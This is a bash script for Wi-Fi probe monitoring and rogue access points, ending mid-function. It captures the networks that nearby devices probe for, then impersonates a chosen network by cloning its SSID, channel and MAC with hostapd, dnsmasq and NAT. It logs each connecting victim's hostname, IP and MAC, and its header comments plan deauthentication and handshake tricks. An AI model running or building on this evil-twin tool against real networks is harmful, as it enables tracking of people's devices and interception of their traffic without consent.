#!/usr/bin/env bash
# version: 2.1, 29/11/2025 17:46

# ADD Deauth attack
# Accept any wpa2 handshake ? trick


UN=${SUDO_USER:-$(whoami)}
targets_path="/home/$UN/Desktop/wifi-probe-monitor"
mkdir -p "$targets_path"
OUI_FILE="$targets_path/oui.txt"
AIRODUMP_FILE="$targets_path/airodump_scan.csv"

SCRIPT_START_TIME=$(date +'%d/%m/%y %H:%M:%S')
declare -A device_ssids # APs per device (array-like string separated by ||)
declare -A device_macs # Vendor per device
declare -A device_first_seen # First seen timestamp per device
declare -A vendor_cache # OUI cache
declare -A device_ssid_counts # count of how many times device probed each SSID
declare -A ap_details_cache # Cache for AP details (MAC, encryption, channel, power)
declare -A device_power # Power level per device

# Colors
RED="\033[1;31m"
r_RED="\033[31m"
GREEN="\033[1;32m"
r_GREEN="\033[32m"
BLUE="\033[1;34m"
r_BLUE="\033[34m"
YELLOW="\033[33m"  
ORANGE="\033[1;33m"
CYAN="\033[1;36m"
WHITE="\033[1;37m"
NEON_YELLOW="\033[38;5;226m"
NEON_GREEN="\033[38;5;82m"
NEON_PURPLE="\033[38;5;201m"
RESET="\033[0m"
BOLD="\033[1m"


# Global variables for cleanup
WIFI_ADAPTER=""
ORIGINAL_ADAPTER=""
CLEANUP_DONE=false
AIRODUMP_PID=""
USER_SELECTION_MODE=false

# Rogue AP variables
ROGUE_SSID="Open WiFi"
ROGUE_CHANNEL="6"
ROGUE_AP_MAC=""
ROGUE_ENCRYPTION=""
LAN_INTERFACE="eth0"
AP_IP="192.168.50.1"
DHCP_RANGE_START="192.168.50.10"
DHCP_RANGE_END="192.168.50.20"

# Check if the script is run as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Please run this script as root or with sudo.${RESET}"
    exit 1
fi

# ==================== ROGUE AP FUNCTIONS ====================

rogue_ap_dependencies() {
    DEPS=(hostapd dnsmasq iw iproute2 macchanger wget iptables procps)
    MISSING=()

    # Detect missing packages
    for pkg in "${DEPS[@]}"; do
        if ! dpkg -s "$pkg" >/dev/null 2>&1; then
            echo -e "${r_RED}[!] Missing: $pkg${RESET}"
            MISSING+=("$pkg")
        fi
    done

    # Install only missing ones
    if [ ${#MISSING[@]} -gt 0 ]; then
        echo -e "\n[*] Installing missing packages: ${MISSING[*]}\n"
        sudo apt update -y > /dev/null 2>&1
        sudo apt install -y "${MISSING[@]}"
    fi
}

rogue_ap_hardware_check() {
    if ! ip link show "$WIFI_ADAPTER" > /dev/null 2>&1; then
        echo -e "${r_RED}[!] Interface $WIFI_ADAPTER not found${RESET}"
        return 1
    fi

    if iw list 2>/dev/null | grep -q "AP"; then
        echo -e "${r_GREEN}[✓] Interface supports AP mode${RESET}"
    else
        echo -e "${r_RED}[!] Interface may not support AP mode${RESET}"
        return 1
    fi
    return 0
}

rogue_ap_country_check() {
    local current_reg
    current_reg=$(iw reg get 2>/dev/null | grep "country" | head -1 | awk '{print $2}' | sed 's/://')
    echo -e "[*] Current Country: ${current_reg:-Not set}."

    if [[ -z "$COUNTRY" ]]; then
        if [[ "$current_reg" == "00" ]]; then
            echo "[*] Regulatory domain is 00, setting country to 'US'."
            COUNTRY="US"
        elif [[ -n "$current_reg" ]]; then
            COUNTRY="$current_reg"
        else
            echo "[*] No country specified and cannot detect current, setting to 'US'."
            COUNTRY="US"
        fi
    fi

    if [[ "$COUNTRY" == "00" ]]; then
        echo "[!] hostapd won't accept region '00'. changing to 'US'."
        COUNTRY="US"
    fi

    if [[ "$current_reg" != "$COUNTRY" ]]; then
        echo -e "[*] Changing country to $COUNTRY..."
        sudo iw reg set "$COUNTRY" > /dev/null 2>&1
    fi
}

rogue_ap_channel_check() {
    local iw_output
    iw_output=$(iw list 2>/dev/null)

    declare -A allowed_24 allowed_5 allowed_6
    declare -A dfs_24 dfs_5 dfs_6
    declare -A disabled_24 disabled_5 disabled_6
    declare -A noir_24 noir_5 noir_6

    while IFS= read -r line; do
        if [[ "$line" =~ ^[[:space:]]*Band[[:space:]]+([0-9]+): ]]; then
            case "${BASH_REMATCH[1]}" in
                1) current_band="24" ;;
                2) current_band="5" ;;
                4) current_band="6" ;;
                *) current_band="" ;;
            esac
            continue
        fi

        [[ -z "$current_band" ]] && continue

        if [[ "$line" =~ \[*[[:space:]]*([0-9]+)[[:space:]]*MHz[[:space:]]*\[([0-9]+)\](.*) ]]; then
            local channel="${BASH_REMATCH[2]}"
            local rest="${BASH_REMATCH[3]}"

            local type="allowed"
            [[ "$rest" =~ disabled ]] && type="disabled"
            [[ "$rest" =~ "radar detection" ]] && type="dfs"
            [[ "$rest" =~ "no IR" ]] && type="noir"
            [[ "$rest" =~ "radar detection" ]] && [[ "$rest" =~ "no IR" ]] && type="dfs_noir"

            case "$current_band:$type" in
                "24:allowed") allowed_24["$channel"]=1 ;;
                "5:allowed") allowed_5["$channel"]=1 ;;
                "6:allowed") allowed_6["$channel"]=1 ;;
                "24:dfs") dfs_24["$channel"]=1 ;;
                "5:dfs") dfs_5["$channel"]=1 ;;
                "6:dfs") dfs_6["$channel"]=1 ;;
                "24:disabled") disabled_24["$channel"]=1 ;;
                "5:disabled") disabled_5["$channel"]=1 ;;
                "6:disabled") disabled_6["$channel"]=1 ;;
                "24:noir") noir_24["$channel"]=1 ;;
                "5:noir") noir_5["$channel"]=1 ;;
                "6:noir") noir_6["$channel"]=1 ;;
                "24:dfs_noir")
                    dfs_24["$channel"]=1
                    noir_24["$channel"]=1
                    ;;
                "5:dfs_noir")
                    dfs_5["$channel"]=1
                    noir_5["$channel"]=1
                    ;;
                "6:dfs_noir")
                    dfs_6["$channel"]=1
                    noir_6["$channel"]=1
                    ;;
            esac
        fi
    done <<< "$iw_output"

    # Helper function to format channel lists numerically
    format_channels() {
        local -n channels=$1
        if [ ${#channels[@]} -eq 0 ]; then
            echo "(none)"
            return
        fi
        local sorted=($(printf '%s\n' "${!channels[@]}" | sort -n))
        printf '%s' "$(IFS=,; echo "${sorted[*]}")"
    }

    echo -e "[*] Channel information in $COUNTRY:"
    
    echo -e "    ${r_GREEN}[✓] Allowed channels:${RESET}"
    echo -e "        2.4GHz: $(format_channels allowed_24)"
    echo -e "        5GHz:   $(format_channels allowed_5)"
    echo -e "        6GHz:   $(format_channels allowed_6)"

    echo -e "    ${YELLOW}[!] DFS (radar detection) channels:${RESET}"
    echo -e "        2.4GHz: $(format_channels dfs_24)"
    echo -e "        5GHz:   $(format_channels dfs_5)"
    echo -e "        6GHz:   $(format_channels dfs_6)"

    echo -e "    ${r_RED}[!] Disabled channels:${RESET}"
    echo -e "        2.4GHz: $(format_channels disabled_24)"
    echo -e "        5GHz:   $(format_channels disabled_5)"
    echo -e "        6GHz:   $(format_channels disabled_6)"

    echo -e "    ${r_BLUE}[!] No IR channels:${RESET}"
    echo -e "        2.4GHz: $(format_channels noir_24)"
    echo -e "        5GHz:   $(format_channels noir_5)"
    echo -e "        6GHz:   $(format_channels noir_6)"

    # Manual channel selection
    if [[ -n "$ROGUE_CHANNEL" ]]; then
        echo -e "\n[*] Specified channel: $ROGUE_CHANNEL"

        if [[ -n "${disabled_24[$ROGUE_CHANNEL]}" || -n "${disabled_5[$ROGUE_CHANNEL]}" ]]; then
            echo -e "${r_RED}[!] ERROR: Channel $ROGUE_CHANNEL is DISABLED for $COUNTRY!${RESET}"
            return 1
        fi

        if [[ -n "${dfs_24[$ROGUE_CHANNEL]}" || -n "${dfs_5[$ROGUE_CHANNEL]}" ]]; then
            echo -e "${r_RED}[!] ERROR: Channel $ROGUE_CHANNEL has DFS (radar detection) restriction in $COUNTRY!${RESET}"
            return 1
        fi
        
        if [[ -n "${noir_24[$ROGUE_CHANNEL]}" || -n "${noir_5[$ROGUE_CHANNEL]}" ]]; then
            echo -e "${r_RED}[!] ERROR: Channel $ROGUE_CHANNEL has No IR (cannot initiate AP) restriction in $COUNTRY!${RESET}"
            return 1
        fi

        if [[ -z "${allowed_24[$ROGUE_CHANNEL]}" && -z "${allowed_5[$ROGUE_CHANNEL]}" ]]; then
            echo -e "${r_RED}[!] ERROR: Channel $ROGUE_CHANNEL is not in the allowed 2.4GHz or 5GHz channels for $COUNTRY!${RESET}"
            return 1
        fi
        
        echo -e "${r_GREEN}[✓] Channel $ROGUE_CHANNEL is allowed.${RESET}\n"
    else
        echo -e "\n[*] No channel specified, randomizing channel..."
        available_channels=("${!allowed_24[@]}" "${!allowed_5[@]}")
        available_channels=($(printf '%s\n' "${available_channels[@]}" | sort -n))
        ROGUE_CHANNEL="${available_channels[RANDOM % ${#available_channels[@]}]}"
        echo -e "${r_GREEN}[✓] Randomized channel selected: $ROGUE_CHANNEL${RESET}"
    fi
    
    return 0
}

rogue_ap_set_mac() {
    local iface="$WIFI_ADAPTER"

    if [[ -z "$ROGUE_AP_MAC" ]]; then
        echo -e "[*] No AP MAC specified — randomizing MAC:"
        sudo ip link set "$iface" down

        local perm_output
        perm_output=$(macchanger -p "$iface" 2>/dev/null)
        local perm_mac
        perm_mac=$(echo "$perm_output" | awk -F': ' '/Permanent MAC:/ {print toupper($2)}' | cut -d' ' -f1)
        local perm_vendor
        perm_vendor=$(get_vendor "$perm_mac")

        local rand_output
        rand_output=$(macchanger -r "$iface" 2>/dev/null)
        local rand_mac
        rand_mac=$(echo "$rand_output" | awk -F': ' '/New MAC:/ {print toupper($2)}' | cut -d' ' -f1)

        if [[ -z "$rand_mac" ]]; then
            rand_mac=$(ip link show "$iface" | awk '/link\/ether/ {print toupper($2)}')
        fi

        sudo ip link set "$iface" up

        echo -e "      Permanent MAC:  $perm_mac   ($perm_vendor)"
        echo -e "${r_GREEN}    ✓ Randomized MAC: $rand_mac ${RESET}"
    else
        local mac="$ROGUE_AP_MAC"
        sudo ip link set "$iface" down
        sudo ip link set dev "$iface" address "$mac"
        sudo ip link set "$iface" up

        local new_mac
        new_mac=$(ip link show "$iface" | awk '/link\/ether/ {print toupper($2)}')
        local vendor
        vendor=$(get_vendor "$new_mac")
        echo "[*] Using provided MAC address: $new_mac ($vendor)"
    fi
}

rogue_ap_cleanup() {
    echo -e "\n[*] Stopping AP..."
    sudo pkill hostapd
    sudo rm -f /tmp/hostapd.conf
    sudo pkill dnsmasq
    sudo rm -f /var/lib/misc/dnsmasq.leases
    sudo iptables -t nat -D POSTROUTING -o $LAN_INTERFACE -j MASQUERADE 2>/dev/null
    sudo iptables -D FORWARD -i $LAN_INTERFACE -o $WIFI_ADAPTER -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null
    sudo iptables -D FORWARD -i $WIFI_ADAPTER -o $LAN_INTERFACE -j ACCEPT 2>/dev/null
    sudo ip link set $WIFI_ADAPTER down
    sudo ip addr flush dev $WIFI_ADAPTER
    sudo iw dev $WIFI_ADAPTER set type managed 2>/dev/null
    sudo ip link set $WIFI_ADAPTER up
    sudo systemctl start NetworkManager
    echo -e "${r_GREEN}[✓] Cleanup complete. Wi-Fi interface restored to normal mode.${RESET}"
}

# Client connection monitoring functions
get_client_name() {
    local MAC=$1
    grep -i "$MAC" /var/lib/misc/dnsmasq.leases | awk '{print $4}' || echo "Unknown"
}

get_client_ip() {
    local MAC=$1
    grep -i "$MAC" /var/lib/misc/dnsmasq.leases | awk '{print $3}' || echo "Unknown"
}

wait_for_dhcp_info() {
    local mac=$1
    local timeout=60
    local elapsed=0
    local ip name

    while [ $elapsed -lt $timeout ]; do
        ip=$(get_client_ip "$mac")
        name=$(get_client_name "$mac")
        if [[ -n "$ip" && "$ip" != "Unknown" ]]; then
            echo "$ip|$name"
            return
        fi
        sleep 0.5
        ((elapsed++))
    done

    echo "Unknown|Unknown"
}

rogue_ap_monitor_clients() {
    local LOG_FILE="$targets_path/AP_clients.log"
    touch $LOG_FILE
    declare -A CLIENTS
    printf "\r\033[K"
    echo -e "[*] Waiting for clients to connect:\n\n"

    while true; do
        STATIONS=$(iw dev $WIFI_ADAPTER station dump | grep Station | awk '{print toupper($2)}')
        TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")

        # Detect New Connections
        for MAC in $STATIONS; do
            if [[ -z "${CLIENTS[$MAC]}" ]]; then
                DEVICE_INFO=$(wait_for_dhcp_info "$MAC")
                IP=$(echo "$DEVICE_INFO" | cut -d'|' -f1)
                NAME=$(echo "$DEVICE_INFO" | cut -d'|' -f2)
                OUI=$(get_vendor "$MAC")

                printf "\r\033[K"

                printf -v MSG "[%s] CONNECTED!      Name: %-9s | IP: %-13s | MAC: %17s | OUI: %s" \
                "$TIMESTAMP" "$NAME" "$IP" "$MAC" "$OUI"

                echo -e "${GREEN}${MSG}${RESET}"
                echo "$MSG" >> "$LOG_FILE"
                CLIENTS[$MAC]=1
            fi
        done

        # Detect Disconnections
        for MAC in "${!CLIENTS[@]}"; do
            if ! echo "$STATIONS" | grep -q "$(echo "$MAC" | tr 'a-z' 'A-Z')"; then
                IP=$(get_client_ip "$MAC")
                NAME=$(get_client_name "$MAC")
                OUI=$(get_vendor "$MAC")

                printf "\r\033[K"

                printf -v MSG "[%s] DISCONNECTED!      Name: %-9s | IP: %-13s | MAC: %17s | OUI: %s" \
                "$TIMESTAMP" "$NAME" "$IP" "$MAC" "$OUI"

                echo -e "${RED}${MSG}${RESET}\n"
                echo "$MSG" >> "$LOG_FILE"
                unset CLIENTS[$MAC]
            fi
        done

        sleep 0.5
    done
}

rogue_ap() {
    echo -e "\n${NEON_GREEN}=== Starting Rogue AP ===${RESET}"
    
    # Stop monitor mode first
    if [[ -n "$WIFI_ADAPTER" && "$WIFI_ADAPTER" == *"mon" ]]; then
        echo "Stopping monitor mode on $WIFI_ADAPTER"
        airmon-ng stop "$WIFI_ADAPTER" >/dev/null 2>&1
        WIFI_ADAPTER="$ORIGINAL_ADAPTER"
    fi

    # Install dependencies
    rogue_ap_dependencies

    # Hardware check
    rogue_ap_hardware_check || { echo -e "${r_RED}[!] Hardware check failed. Exiting.${RESET}"; return 1; }
    
    # Country and channel checks
    rogue_ap_country_check
    rogue_ap_channel_check || return 1

    # Stop NetworkManager
    sudo systemctl stop NetworkManager

    echo "[*] Setting $WIFI_ADAPTER to AP mode..."
    sudo ip link set $WIFI_ADAPTER down
    sudo ip addr flush dev $WIFI_ADAPTER
    rogue_ap_set_mac
    sudo iw dev $WIFI_ADAPTER set type ap 2>/dev/null
    sudo ip addr add $AP_IP/24 dev $WIFI_ADAPTER
    sudo ip link set $WIFI_ADAPTER up

    # Create hostapd configuration
    HOSTAPD_CONF="/tmp/hostapd.conf"
    
    # Calculate center frequency based on channel
    get_center_freq() {
        local channel=$1
        case $channel in
            36|40|44|48) echo "42" ;;
            52|56|60|64) echo "58" ;;
            100|104|108|112) echo "106" ;;
            116|120|124|128) echo "122" ;;
            132|136|140|144) echo "138" ;;
            149|153|157|161) echo "155" ;;
            165|169) echo "" ;;
            *) echo "$channel" ;;
        esac
    }

    CENTER_FREQ=$(get_center_freq $ROGUE_CHANNEL)

    # Determine band & capabilities
    if (( ROGUE_CHANNEL >= 1 && ROGUE_CHANNEL <= 14 )); then
        HW_MODE="g"
        IEEE80211N="ieee80211n=1"
        HT_CAPAB="[HT20]"
    elif (( ROGUE_CHANNEL >= 36 && ROGUE_CHANNEL <= 161 )); then
        HW_MODE="a"
        IEEE80211N="ieee80211n=1"
        IEEE80211AC="ieee80211ac=1"
        HT_CAPAB="[HT40+]"
        VHT_CAPAB="[SHORT-GI-80][SU-BEAMFORMEE][VHT80]"
        VHT_EXTRA="vht_oper_chwidth=1
vht_oper_centr_freq_seg0_idx=$CENTER_FREQ"
    elif (( ROGUE_CHANNEL >= 165 && ROGUE_CHANNEL <= 177 )); then
        HW_MODE="a"
        IEEE80211N="ieee80211n=1"
        HT_CAPAB="[HT20]"
    else
        echo -e "${r_RED}[!] Invalid channel: $ROGUE_CHANNEL in your region: $COUNTRY.${RESET}"
        rogue_ap_cleanup
        return 1
    fi

    # Create hostapd config
    cat <<EOF > $HOSTAPD_CONF
interface=$WIFI_ADAPTER
ssid=$ROGUE_SSID
channel=$ROGUE_CHANNEL
country_code=$COUNTRY
auth_algs=1
driver=nl80211
hw_mode=$HW_MODE
$IEEE80211N
$IEEE80211AC
EOF

    [[ -n "$HT_CAPAB" ]] && echo "ht_capab=$HT_CAPAB" >> $HOSTAPD_CONF
    [[ -n "$VHT_CAPAB" ]] && echo "vht_capab=$VHT_CAPAB" >> $HOSTAPD_CONF
    [[ -n "$VHT_EXTRA" ]] && echo "$VHT_EXTRA" >> $HOSTAPD_CONF

    cat <<EOF >> $HOSTAPD_CONF
ieee80211d=1
ieee80211h=1
wmm_enabled=1
ignore_broadcast_ssid=0
EOF

    # Start hostapd
    sudo hostapd $HOSTAPD_CONF > /tmp/hostapd.log 2>&1 & 
    HAPD_PID=$!

    echo "[*] Starting hostapd..."
    timeout=15
    elapsed=0
    while [ $elapsed -lt $timeout ]; do
        if grep -q "AP-ENABLED" /tmp/hostapd.log; then
            break
        fi
        if grep -qi -E "AP-DISABLED|error|invalid" /tmp/hostapd.log; then
            echo -e "${r_RED}[!] Hostapd failed to start.${RESET}"
            echo -e "${r_RED}--- Hostapd log ---${RESET}"
            awk '{print "\t"$0}' /tmp/hostapd.log
            kill $HAPD_PID 2>/dev/null
            rogue_ap_cleanup
            return 1
        fi
        sleep 1
        ((elapsed++))
    done

    if ! grep -q "AP-ENABLED" /tmp/hostapd.log; then
        echo -e "${r_RED}[!] Hostapd did not start within $timeout seconds. Check /tmp/hostapd.log${RESET}"
        rogue_ap_cleanup
        return 1
    fi

    # DNSMASQ CONFIG
    DNSMASQ_CONF=$(mktemp)
    cat <<EOF > $DNSMASQ_CONF
interface=$WIFI_ADAPTER
dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,1h
EOF

    echo "[*] Starting dnsmasq..."
    sudo dnsmasq -C $DNSMASQ_CONF

    # NAT/INTERNET SHARING
    sudo iptables -t nat -A POSTROUTING -o $LAN_INTERFACE -j MASQUERADE
    sudo iptables -A FORWARD -i $LAN_INTERFACE -o $WIFI_ADAPTER -m state --state RELATED,ESTABLISHED -j ACCEPT
    sudo iptables -A FORWARD -i $WIFI_ADAPTER -o $LAN_INTERFACE -j ACCEPT
    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
    
    printf "\r\033[K"  # Clear line and return to beginning    

    echo -e "\n${r_GREEN}[✓] AP ${ORANGE}'$ROGUE_SSID'${RESET} ${r_GREEN}started on Channel ${ORANGE}'$ROGUE_CHANNEL'.${RESET}"
    
    printf "\r\033[K"
    # Start client monitoring in background
    rogue_ap_monitor_clients &
    MONITOR_PID=$!

    # Wait for user to stop
    echo -e "\n\n${CYAN}Press Ctrl+C to stop the Rogue AP...${RESET}"
    while true; do
        sleep 1
    done
}

# ==================== MAIN SCRIPT FUNCTIONS ====================

# User selection function
user_selection() {
    echo
    echo -e "${NEON_GREEN}=== Device Selection ===${RESET}"
    echo -e "${CYAN}Enter the row number from the scan above:${RESET}"
    echo -e "${ORANGE}(Press Enter without number to exit)${RESET}"
    
    # Get user input
    read -p "Row number: " selection
    
    if [[ -z "$selection" ]]; then
        echo -e "${ORANGE}No selection made. Exiting.${RESET}"
        return 1
    fi
    
    # Validate selection is a number
    if [[ ! "$selection" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}Invalid selection. Please enter a number.${RESET}"
        return 1
    fi
    
    # Find the selected device/AP pair
    local count=1
    local selected_device=""
    local selected_ap=""
    
    for dev in $(for d in "${!device_first_seen[@]}"; do echo "${device_first_seen[$d]} $d"; done | sort | awk '{print $2}'); do
        IFS='||' read -ra aps <<< "${device_ssids[$dev]}"
        for ap in "${aps[@]}"; do
            [[ -n "$ap" && "$ap" != "1" ]] || continue
            if [[ $count -eq $selection ]]; then
                selected_device="$dev"
                selected_ap="$ap"
                break 2
            fi
            ((count++))
        done
    done
    
    if [[ -z "$selected_device" ]]; then
        echo -e "\n${RED}Invalid row number. Please select a valid row from 1 to $((count-1)).${RESET}"
        return 1
    fi
    
    # Display the selected row details in the requested format
    display_selected_row "$selected_device" "$selected_ap"
    return 0
}

# Function to display selected row details
display_selected_row() {
    local device_mac="$1"
    local ap_name="$2"
    
    echo
    echo -e "${NEON_GREEN}=== Selected Device ===${RESET}"
    
    # Get device vendor
    local device_vendor="${device_macs[$device_mac]}"
    
    # Get AP details
    local ap_details=$(get_ap_details "$ap_name")
    local ap_mac=$(echo "$ap_details" | cut -d'|' -f1)
    local ap_power=$(echo "$ap_details" | cut -d'|' -f2)
    local ap_channel=$(echo "$ap_details" | cut -d'|' -f3)
    local ap_encryption=$(echo "$ap_details" | cut -d'|' -f4)
    local ap_vendor=$(echo "$ap_details" | cut -d'|' -f5)
    
    # Set default values if empty
    [[ -z "$ap_mac" || "$ap_mac" == "Not Found" ]] && ap_mac="N/A"
    [[ -z "$ap_power" ]] && ap_power="N/A"
    [[ -z "$ap_channel" ]] && ap_channel="N/A"
    [[ -z "$ap_encryption" ]] && ap_encryption="N/A"
    [[ -z "$ap_vendor" ]] && ap_vendor="N/A"
    
    # Set Rogue AP parameters
    if [[ "$ap_mac" != "N/A" && "$ap_channel" != "N/A" ]]; then
        ROGUE_SSID="$ap_name"
        ROGUE_CHANNEL="$ap_channel"
        ROGUE_AP_MAC="$ap_mac"
        ROGUE_ENCRYPTION="$ap_encryption"
    else
        # Use defaults if AP details not found
        ROGUE_SSID="Open WiFi"
        ROGUE_CHANNEL="6"
        ROGUE_AP_MAC=""
        ROGUE_ENCRYPTION=""
        echo -e "${ORANGE}[!] Using default settings for Rogue AP${RESET}"
    fi
    
    # Display in the requested format
    echo -e "Device: ${device_mac} - ${device_vendor}"
    echo -e "AP Name: ${ap_name}"
    echo -e "MAC: ${ap_mac} - ${ap_vendor}"
    echo -e "Channel: ${ap_channel}"
    echo -e "Encryption: ${ap_encryption}"
    echo -e "Power: ${ap_power}"
    echo
    
    # Ask user about rogue AP
    read -p "Do you want to Rogue this AP? (Y/N): " rogue_choice
    
    case "$rogue_choice" in
        [Yy]*)
            echo -e "${r_GREEN}Starting rogue AP...${RESET}"
            rogue_ap
            ;;
        [Nn]*)
            echo -e "${ORANGE}Exiting without starting rogue AP.${RESET}"
            ;;
        *)
            echo -e "${RED}Invalid choice. Exiting.${RESET}"
            ;;
    esac
}

# Enhanced cleanup function
cleanup() {
    # Prevent multiple cleanup executions
    if [[ "$CLEANUP_DONE" == true ]]; then
        return
    fi
    
    echo
    echo -e "\n${RED}Interrupt received. Stopping scan...${RESET}"
    
    # Kill airodump-ng process
    #echo "Stopping airodump-ng process..."
    if [[ -n "$AIRODUMP_PID" ]]; then
        kill "$AIRODUMP_PID" >/dev/null 2>&1
    fi
    pkill -f "airodump-ng" >/dev/null 2>&1
    sleep 1
    
    # Only ask for user selection if we have devices detected
    if [ ${#device_first_seen[@]} -gt 0 ]; then
        user_selection
    else
        echo -e "${ORANGE}No devices detected. Exiting.${RESET}"
    fi
    
    # Continue with normal cleanup
    CLEANUP_DONE=true
    
    echo "Cleaning temporary files..."
    rm -f "/tmp/ap_scan_$$"* >/dev/null 2>&1
    
    # Stop monitor mode and restore original interface
    if [[ -n "$WIFI_ADAPTER" && "$WIFI_ADAPTER" == *"mon" ]]; then
        echo "Stopping monitor mode on $WIFI_ADAPTER"
        airmon-ng stop "$WIFI_ADAPTER" >/dev/null 2>&1
    fi
    
    # Restart network manager
    echo "Restarting network services..."
    systemctl restart NetworkManager >/dev/null 2>&1 || service network-manager restart >/dev/null 2>&1
    rogue_ap_cleanup
    exit 0
}

# Set trap for signals
trap cleanup INT TERM EXIT

# [Rest of your existing functions remain exactly the same...]
check_oui() {
    if [ ! -f "$OUI_FILE" ]; then
        echo "${ORANGE}Downloading OUI vendor file...${RESET}"
        wget -q https://raw.githubusercontent.com/idoCo10/OUI-list/main/oui.txt -O "$OUI_FILE"
        [[ ! -f "$OUI_FILE" ]] && { echo "${RED}Failed to download OUI vendor file.${RESET}"; exit 1; }
    fi
}

adapter_config() {
    airmon-ng check kill > /dev/null 2>&1
    adapters=($(iw dev | awk '$1=="Interface"{print $2}'))
    
    if [[ ${#adapters[@]} -eq 0 ]]; then
        read -p "Enter your WiFi adapter name: " wifi_adapter
        [[ -z "$wifi_adapter" ]] && { echo "${RED}No adapter provided. Exiting.${RESET}"; exit 1; }
    elif [[ ${#adapters[@]} -eq 1 ]]; then
        wifi_adapter="${adapters[0]}"
    else
        echo "Detected adapters:"
        for i in "${!adapters[@]}"; do
            echo "$((i+1))) ${adapters[$i]}"
        done
        read -p "Select adapter by number or name: " input
        if [[ "$input" =~ ^[0-9]+$ && "$input" -ge 1 && "$input" -le ${#adapters[@]} ]]; then
            wifi_adapter="${adapters[$((input-1))]}"
        else
            wifi_adapter="$input"
        fi
    fi
    
    ORIGINAL_ADAPTER="$wifi_adapter"
    
    if [[ "$wifi_adapter" != *"mon" ]]; then
        airmon-ng start "$wifi_adapter" > /dev/null 2>&1
        adapters=($(iw dev | awk '$1=="Interface"{print $2}'))
        for adapter in "${adapters[@]}"; do
            [[ "$adapter" == *"mon" ]] && wifi_adapter="$adapter"
        done
    fi
    
    WIFI_ADAPTER="$wifi_adapter"
}

normalize_mac() {
    echo "$1" | tr '[:lower:]' '[:upper:]' | sed 's/[-\.]/:/g'
}

get_vendor() {
    local mac="$1"
    [[ -n "${vendor_cache[$mac]}" ]] && echo "${vendor_cache[$mac]}" && return
    
    local prefix=$(echo "$mac" | cut -d':' -f1-3)
    local vendor=$(grep -i "^$prefix " "$OUI_FILE" | awk '{$1=""; print substr($0,2)}')
    vendor="${vendor:-}"
    vendor_cache[$mac]="$vendor"
    echo "$vendor"
}

decode_ssid_if_hex() {
    local ssid="$1"
    if [[ "$ssid" =~ ^[0-9A-Fa-f]+$ && $(( ${#ssid} % 2 )) -eq 0 ]]; then
        local decoded
        decoded="$(echo "$ssid" | xxd -r -p 2>/dev/null || true)"
        [[ -n "$decoded" && "$decoded" =~ [[:print:]] ]] && echo "$decoded" && return
    fi
    echo "$ssid"
}

install_dependencies() {
    if ! command -v airodump-ng >/dev/null 2>&1; then
        echo "airodump-ng not found. Installing..."
        apt update && apt install -y aircrack-ng
    fi
}

start_airodump_scan() {
    echo -e "${ORANGE}Starting airodump-ng scan on $WIFI_ADAPTER...${RESET}"
    
    # Remove any existing airodump files
    rm -f "$AIRODUMP_FILE"* >/dev/null 2>&1
    
    # Start airodump-ng in background
    airodump-ng "$WIFI_ADAPTER" --band abg --ignore-negative-one --output-format csv -w "$AIRODUMP_FILE" >/dev/null 2>&1 &
    AIRODUMP_PID=$!
    
    # Wait for CSV file to be created
    local max_wait=10
    local wait_count=0
    while [[ ! -f "${AIRODUMP_FILE}-01.csv" && $wait_count -lt $max_wait ]]; do
        sleep 1
        ((wait_count++))
    done
    
    if [[ ! -f "${AIRODUMP_FILE}-01.csv" ]]; then
        echo "${RED}Failed to start airodump-ng scan${RESET}"
        exit 1
    fi
    
    echo "${GREEN}Airodump-ng scan started successfully (PID: $AIRODUMP_PID)${RESET}"
}

parse_probe_requests() {
    local csv_file="${AIRODUMP_FILE}-01.csv"
    
    if [[ ! -f "$csv_file" ]]; then
        return
    fi
    
    # Use process substitution to avoid subshell issues
    while IFS= read -r line; do
        # Skip empty lines
        [[ -z "$line" ]] && continue
        
        # Extract fields manually to handle commas in probed ESSIDs
        station_mac=$(echo "$line" | cut -d',' -f1 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        first_seen=$(echo "$line" | cut -d',' -f2 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        power=$(echo "$line" | cut -d',' -f4 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        packets_count=$(echo "$line" | cut -d',' -f5 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        
        # Get everything from field 7 to the end as probed ESSIDs
        probed_essids=$(echo "$line" | cut -d',' -f7- | sed 's/^[[:space:]]*//;s/[[:space:]]*$//;s/,$//')
        
        # Skip incomplete records or header
        [[ -z "$station_mac" || "$station_mac" == "Station MAC" || ! "$station_mac" =~ ":" ]] && continue
        
        # Normalize MAC
        station_mac=$(normalize_mac "$station_mac")
        
        # Get vendor
        vendor=$(get_vendor "$station_mac")
        
        # Extract time from first_seen (remove date part)
        first_seen_time=$(echo "$first_seen" | grep -oP '\d{2}:\d{2}:\d{2}' | head -1)
        [[ -z "$first_seen_time" ]] && first_seen_time="$(date +%H:%M:%S)"
        
        # Only process if we have probed ESSIDs and they are not "(not associated)"
        if [[ -n "$probed_essids" && "$probed_essids" != "(not associated)" ]]; then
            # Split multiple ESSIDs by comma and process each one
            IFS=',' read -ra essid_array <<< "$probed_essids"
            for essid in "${essid_array[@]}"; do
                # Clean up each individual ESSID
                essid_clean=$(echo "$essid" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
                [[ -z "$essid_clean" ]] && continue
                
                # Decode if hex
                essid_decoded=$(decode_ssid_if_hex "$essid_clean")
                
                # Skip empty or generic probes
                if [[ -n "$essid_decoded" && "$essid_decoded" != "<MISSING>" && "$essid_decoded" != "Broadcast" && "$essid_decoded" != "(not associated)" ]]; then
                    # Check if this is a new SSID for this device
                    IFS='||' read -ra existing_array <<< "${device_ssids[$station_mac]:-}"
                    found=0
                    for ex in "${existing_array[@]}"; do
                        if [[ "$ex" == "$essid_decoded" ]]; then
                            found=1
                            key="${station_mac}_${essid_decoded}"
                            # Update probe count from CSV
                            device_ssid_counts["$key"]=$packets_count
                            break
                        fi
                    done
                    
                    if [[ $found -eq 0 ]]; then
                        # New SSID for this device
                        if [[ -z "${device_ssids[$station_mac]+_}" ]]; then
                            device_ssids["$station_mac"]="$essid_decoded"
                        else
                            device_ssids["$station_mac"]+="||$essid_decoded"
                        fi
                        key="${station_mac}_${essid_decoded}"
